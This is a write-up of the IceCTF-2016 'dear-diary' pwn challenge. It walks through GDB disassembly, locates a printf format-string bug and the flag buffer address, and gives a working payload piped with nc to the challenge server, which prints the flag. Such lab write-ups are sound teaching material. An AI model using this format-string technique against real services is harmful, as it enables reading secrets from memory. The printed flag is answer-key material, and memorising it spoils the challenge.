# IceCTF-2016 : dear-diary-60

**Category:** Pwn
**Points:** 60
**Description:**

We all want to keep our secrets secure and what is more important than our precious diary entries? We made this highly secure diary service that is sure to keep all your boy crushes and edgy poems safe from your parents. nc diary.vuln.icec.tf 6501download file

## Writeup

Looking around the binary with GDB we can find that:
- the function `flag()` is called at the start of `main()` and it reads content from `./flag.txt` file.
- `print_entry` suffers of a string format vulnerability that allow us to read arbitrary memory addresses.

```sh
[dom28:ago:16 20:22:46] phra@kali ~/ctf/write-ups-2016 $ gdb ./dear_diary
(gdb) set disassembly-flavor intel
(gdb) disas print_entry 
Dump of assembler code for function print_entry:
   0x08048721 <+0>:     push   ebp
   0x08048722 <+1>:     mov    ebp,esp
   0x08048724 <+3>:     sub    esp,0x28
   0x08048727 <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804872a <+9>:     mov    DWORD PTR [ebp-0x1c],eax
   0x0804872d <+12>:    mov    eax,gs:0x14
   0x08048733 <+18>:    mov    DWORD PTR [ebp-0xc],eax
   0x08048736 <+21>:    xor    eax,eax
   0x08048738 <+23>:    mov    eax,DWORD PTR [ebp-0x1c]
   0x0804873b <+26>:    mov    DWORD PTR [esp],eax
   0x0804873e <+29>:    call   0x8048490 <printf@plt>
   0x08048743 <+34>:    mov    eax,ds:0x804a080
   0x08048748 <+39>:    mov    DWORD PTR [esp],eax
   0x0804874b <+42>:    call   0x80484a0 <fflush@plt>
   0x08048750 <+47>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048753 <+50>:    xor    eax,DWORD PTR gs:0x14
   0x0804875a <+57>:    je     0x8048761 <print_entry+64>
   0x0804875c <+59>:    call   0x80484c0 <__stack_chk_fail@plt>
   0x08048761 <+64>:    leave  
   0x08048762 <+65>:    ret    
End of assembler dump.
(gdb) 
```
`*print_entry+29` calls `printf()` with only one argument, a `char*` pointer to a string that we control.

Now we need the address of the flag, so let\'s disassemble `flag()` function.

```sh
(gdb) disas flag 
Dump of assembler code for function flag:
   0x0804863d <+0>:     push   ebp
   0x0804863e <+1>:     mov    ebp,esp
   0x08048640 <+3>:     sub    esp,0x28
   0x08048643 <+6>:     mov    eax,gs:0x14
   0x08048649 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804864c <+15>:    xor    eax,eax
   0x0804864e <+17>:    mov    DWORD PTR [esp+0x4],0x0
   0x08048656 <+25>:    mov    DWORD PTR [esp],0x8048940
   0x0804865d <+32>:    call   0x8048500 <open@plt>
   0x08048662 <+37>:    mov    DWORD PTR [ebp-0x10],eax
   0x08048665 <+40>:    mov    DWORD PTR [esp+0x8],0x100
   0x0804866d <+48>:    mov    DWORD PTR [esp+0x4],0x804a0a0
   0x08048675 <+56>:    mov    eax,DWORD PTR [ebp-0x10]
   0x08048678 <+59>:    mov    DWORD PTR [esp],eax
   0x0804867b <+62>:    call   0x8048480 <read@plt>
   0x08048680 <+67>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048683 <+70>:    xor    eax,DWORD PTR gs:0x14
   0x0804868a <+77>:    je     0x8048691 <flag+84>
   0x0804868c <+79>:    call   0x80484c0 <__stack_chk_fail@plt>
   0x08048691 <+84>:    leave  
   0x08048692 <+85>:    ret    
End of assembler dump.
```

So the address of the buffer where the flag is loaded is at `0x804a0a0`.
Now we need to find in the stack where to put the address value.

```sh
> [dom28:ago:16 20:54:58] phra@kali ~/ctf/icectf/diary $ echo -ne "1\nAABB%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x\n2\n3\n" | ./dear_diary
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
> AABBf75fa836|f7771000|ffc751b8|ffc765b8|0|a|84e1a800|0|0|ffc765c8|804888c|ffc751b8|4|f7771c20|0|0|1|42424141

1. add entry
2. print latest entry
3. quit
```
We can insert an arbitrary value on the stack and then trigger the format string vulnerability. Let's do it.

### PAYLOAD EXAMPLE
```
                   1\n\xa0\xa0\x04\x08%f%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s\n2\n3\n
                       ^^^^^^^^^^^^^^^                                ^^
                       |||||||||||||||                                ||
                       |_______________________________________________|
                    address of flag                     format string exploitation
```

### EXPLOITING:
```sh
> [lun22:ago:16 00:48:01] phra@kali ~/ctf/icectf/diary $ echo -ne "1\n\xa0\xa0\x04\x08%f%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s\n2\n3\n" | nc diary.vuln.icec.tf 6501
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> Tell me all your secrets: 
1. add entry
2. print latest entry
3. quit
>-2353853267122949880488228771336605507975940228259531131213483876911033610747119179881566931135505952160644480871830309847003193621900077982680289929588490075567303710965080432136832255512352674224129626420279574654921909982545998909142624828095873782519863311234760704.000000ffd440a8ffd454a80a6df56b0000ffd454b8804888cffd440a84f7724c20001IceCTF{this_thing_is_just_sitting_here}


1. add entry
2. print latest entry
3. quit
```
We have found the flag `IceCTF{this_thing_is_just_sitting_here}`.

## Other write-ups and resources

* https://github.com/Alpackers/CTF-Writeups/tree/master/2016/IceCTF/Stage_2/DearDiary
* https://github.com/EspacioTeam/write-ups/tree/master/2016/icectf/Dear%20diary
* https://github.com/1amtom/writeups/tree/master/2016-08-16-IceCTF/pwn-60-dear-diary
* https://github.com/73696e65/ctf-notes/blob/master/2016-IceCTF/Dear_diary-Pwn-60.txt
* https://github.com/WCSC/writeups/tree/master/icectf-2016/dear_diary
* [Japanese](https://ctftime.org/writeup/3813)
* https://github.com/318BR/IceCTF/tree/master/2016/Stage2/Dear_Diary
* https://youtu.be/oFscG4xsDXY
* http://dylanfw.com/blog/2016/08/27/format-string-exploitation-icectf-2016/
* https://github.com/burlingpwn/writeups/tree/master/IceCTF-2016/dear_diary
